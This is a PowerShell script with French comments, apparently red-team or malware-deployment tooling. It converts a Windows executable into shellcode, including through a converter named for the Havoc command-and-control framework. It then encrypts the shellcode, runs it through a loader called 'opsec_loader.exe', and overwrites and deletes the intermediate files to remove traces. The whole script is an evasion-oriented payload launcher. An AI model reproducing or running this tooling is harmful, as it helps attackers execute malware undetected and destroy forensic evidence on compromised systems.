param(
    [Parameter(Mandatory=$true)][string]$exe,
    [Parameter(Mandatory=$true)][string]$pwd
)

# Création de répertoire temporaire sécurisé
$tmp = [System.IO.Path]::GetTempPath() + [System.IO.Path]::GetRandomFileName()
New-Item -ItemType Directory -Force -Path $tmp | Out-Null

$sc = "$tmp\sc.bin"
$enc = "$tmp\enc.bin"

Write-Host "[*] Conversion PE→Shellcode..." -ForegroundColor Cyan

# 1. Conversion avec priorité au convertisseur custom
try {
    python custom_pe2sc.py $exe $sc -ErrorAction SilentlyContinue
} catch {
    python havoc_to_shellcode.py $exe $sc -ErrorAction SilentlyContinue
}

if (-not (Test-Path $sc)) { 
    Write-Host "[-] Échec de conversion du shellcode" -ForegroundColor Red
    Remove-Item -Path $tmp -Recurse -Force -ErrorAction SilentlyContinue
    exit 1
}

Write-Host "[*] Chiffrement du shellcode..." -ForegroundColor Cyan

# 2. Chiffrement
python encrypt_shell.py $sc $pwd $enc
if (-not (Test-Path $enc)) { 
    Write-Host "[-] Échec de chiffrement" -ForegroundColor Red
    # Effacement sécurisé
    $bytes = [byte[]](Get-Content -Path $sc -Encoding Byte)
    for ($i = 0; $i -lt $bytes.Length; $i++) {
        $bytes[$i] = 0
    }
    Set-Content -Path $sc -Value $bytes -Encoding Byte
    Remove-Item -Path $sc -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $tmp -Recurse -Force -ErrorAction SilentlyContinue
    exit 1 
}

# Nettoyage immédiat du shellcode non chiffré
$bytes = [byte[]](Get-Content -Path $sc -Encoding Byte)
for ($i = 0; $i -lt $bytes.Length; $i++) {
    $bytes[$i] = 0
}
Set-Content -Path $sc -Value $bytes -Encoding Byte
Remove-Item -Path $sc -Force -ErrorAction SilentlyContinue

Write-Host "[*] Exécution..." -ForegroundColor Cyan

# 3. Exécution
$res = .\opsec_loader.exe $enc $pwd
$exitCode = $LASTEXITCODE

# 4. Nettoyage final
Write-Host "[*] Nettoyage traces..." -ForegroundColor Cyan
$bytes = [byte[]](Get-Content -Path $enc -Encoding Byte)
for ($i = 0; $i -lt $bytes.Length; $i++) {
    $bytes[$i] = 0
}
Set-Content -Path $enc -Value $bytes -Encoding Byte
Remove-Item -Path $enc -Force -ErrorAction SilentlyContinue
Remove-Item -Path $tmp -Recurse -Force -ErrorAction SilentlyContinue

# 5. Vérification résultat
if ($exitCode -eq 0) {
    Write-Host "[+] Opération terminée avec succès" -ForegroundColor Green
} else {
    Write-Host "[-] Erreur lors de l'exécution: code $exitCode" -ForegroundColor Red
}

exit $exitCode